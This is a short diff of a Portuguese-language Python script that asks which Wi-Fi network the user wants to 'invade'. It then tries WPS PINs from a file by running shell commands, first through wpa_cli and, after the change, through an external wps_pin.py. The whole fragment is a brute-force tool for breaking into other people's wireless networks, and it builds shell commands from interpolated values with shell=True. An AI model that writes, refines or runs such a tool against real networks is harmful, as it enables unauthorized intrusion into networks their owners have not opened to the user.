@@ -49,16 +49,16 @@ print("\n")
 print(ciano + "Qual o nome da rede que deseja invadir? ")
 ssid = input(ciano + "[" + magenta + "~" + ciano + "] " + magenta)
 
-def test_wps_pin(pin,ssid):
-    command = f"wpa_cli -i wlan0 wps_reg {ssid} {pin}"
+def test_wps_pin(pin):
+    command = f"wps_pin.py -p {pin}"
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if result.returncode == 0:
+    if "SUCCESS" in result.stdout:
         return True
     else:
         return False
-def mains():
+
+def main():
     pin_file = "p1.txt"
-    pin1 = ""
 
     with open(pin_file, "r") as file:
         pins = file.read().splitlines()
